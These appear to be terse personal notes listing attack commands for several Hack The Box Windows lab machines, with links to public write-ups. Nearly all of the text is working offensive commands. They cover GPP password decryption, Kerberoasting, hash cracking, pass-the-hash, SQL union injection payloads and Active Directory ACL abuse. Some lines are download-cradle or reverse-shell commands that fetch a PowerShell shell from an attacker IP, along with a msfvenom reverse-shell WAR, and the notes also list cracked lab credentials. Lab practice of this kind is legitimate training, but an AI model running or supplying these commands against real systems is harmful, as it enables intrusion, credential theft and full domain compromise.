# Win-Active
https://0xdf.gitlab.io/2018/12/08/htb-active.html
```
enum4linux 10.10.10.100
smbclient \\\\10.10.10.100\\Replication
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
ldapsearch -x -b "dc=active,dc=htb" -H ldap://10.10.10.100 -D SVC_TGS -w GPPstillStandingStrong2k18 > ldapsearch.txt
./GetUserSPNs.py active.htb/SVC_TGS -dc-ip 10.10.10.100 –request
john hash_admin -w=/usr/share/wordlists/rockyou.txt
./wmiexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100
./psexec.py Administrator:Ticketmaster1968@10.10.10.100
```


# Win-Conceal
https://0xdf.gitlab.io/2019/05/18/htb-conceal.html
```
nmap -sU 10.10.10.116
https://book.hacktricks.xyz/network-services-pentesting/ipsec-ike-vpn-pentesting
ike-scan -M 10.10.10.116
snmpwalk -v2c -c public 10.10.10.116
https://crackstation.net/
ipsec up conceal
nmap -sT -p- 10.10.10.116
ftp 10.10.10.116 : anonymous
put cmd.asp
http://10.10.10.116/upload/cmd.asp?cmd=whoami
cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
http://10.10.10.116/upload/cmd.asp?cmd=powershell%20iex(New-Object%20Net.Webclient).downloadstring(%27http://10.10.14.7/Invoke-PowerShellTcp.ps1%27)
SeImpresonatePrivilege : JuicyPotato
https://0xdf.gitlab.io/2019/05/18/htb-conceal.html
```


# Win-Forest
https://0xdf.gitlab.io/2020/03/21/htb-forest.html
```
ldapsearch -x -b "dc=htb,dc=local" -H ldap://10.10.10.161 > ldapsearch.txt
enum4linux 10.10.10.161
./GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/’
john hashsvc -w=/usr/share/wordlists/rockyou.txt
crackmapexec winrm 10.10.10.161 -u svc-alfresco -p s3rvice
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
iex(new-object net.webclient).downloadstring("http://10.10.14.13/SharpHound.ps1")
invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice
./smbserver.py share . -smb2support -username df -password df
CanPSRemote
iex(new-object net.webclient).downloadstring("http://10.10.14.13/PowerView.ps1")
./secretsdump.py svc-alfresco:s3rvice@10.10.10.161
./wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161
./psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
```


# Win-Jerry
```
nmap -p- -T5 10.10.10.95
http://10.10.10.95:8080/
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.10.95:8080/manager/FUZZ -e .aspx,.php,.txt,.html,.sh
http://10.10.10.95:8080/manager/html
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=80 -f war -o revshell.war
nc -nlvp 80
http://10.10.10.95:8080/revshell/
```


# Win-Search
https://0xdf.gitlab.io/2022/04/30/htb-search.html
```
smbclient \\\\10.10.11.129\\RedirectedFolders$ -U search.htb/hope.sharp
ldapdomaindump -u search\\hope.sharp -p IsolationIsKey? 10.10.11.129
./GetUserSPNs.py search.htb/hope.sharp -dc-ip 10.10.11.129 -request
john hash-web_svc -w=/usr/share/wordlists/rockyou.txt
grep "HelpDesk User" domain_users.grep | awk -F'\t' '{print $3}'
crackmapexec smb 10.10.11.129 -u user_opt.txt -p @3ONEmillionbaby
sheetProtection
pfx2john staff.pfx > pfx_hash
./SharpHound.exe
./smbserver.py share . -smb2support -username df -password df
./BloodHound
Read GMSA Password
./wmiexec.py 'search/tristan.davies:0xdf0xdf!!!@10.10.11.129'
```




# Win-StreamIO

```
https://watch.streamio.htb/
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u https://watch.streamio.htb/FUZZ -fc 403 -e .aspx,.php,.txt,.html
https://watch.streamio.htb/search.php
10' union select 1,2,3,4,5,6 -- -
10' union select 1,@@version,3,4,5,6 -- -
10' union select 1,(select DB_NAME()),3,4,5,6 -- -
10' union select 1,CONCAT(username, ' ', password),3,4,5,6 FROM users-- -
https://crackstation.net/
https://streamio.htb/login.php
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'https://streamio.htb/admin/FUZZ' -b PHPSESSID=uuvl3he49lki4offn75s78p6m4 -e .php
crackmapexec winrm streamio.htb -u nikk37 -p 'get_dem_girls2@yahoo.com'
evil-winrm -i streamIO.htb -u nikk37 -p get_dem_girls2@yahoo.com
upload winPEASx64.exe
./winPEASx64.exe
git clone https://github.com/fox-it/BloodHound.py.git
cd BloodHound.py
python3 setup.py install
python3 bloodhound.py -d streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -gc dc.streamio.htb -ns 10.10.11.158 -c all --zip
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
upload PowerView.ps1
. .\PowerView.ps1
$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText –Force
$Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $SecPassword)
Set-DomainObjectOwner -Identity 'CORE STAFF' -OwnerIdentity JDgodd -Cred $cred
Add-DomainObjectAcl -TargetIdentity "CORE STAFF" -PrincipalIdentity JDgodd -Cred $cred -Rights All
Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'JDgodd' -Cred $cred
net group 'CORE STAFF'
Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred
evil-winrm -i streamIO.htb -u administrator -p e1JFg,55n-b2w5
```
